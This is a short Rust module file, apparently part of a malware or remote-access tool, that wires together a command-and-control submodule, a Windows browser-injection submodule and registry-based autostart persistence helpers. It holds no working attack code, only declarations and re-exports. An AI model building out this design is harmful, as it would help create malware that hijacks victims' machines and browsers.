// Services module - C2 (Command and Control) 機能
pub mod c2;
pub mod autostart;

#[cfg(windows)]
pub mod browser_injection;

#[cfg(windows)]
pub use browser_injection::*;
pub use c2::*;
pub use autostart::{setup_persistence, verify_and_repair_persistence, is_elevated, open_or_create_hkcu, open_or_create_hklm, set_string, close_key, check_and_prevent_multiple_instances};
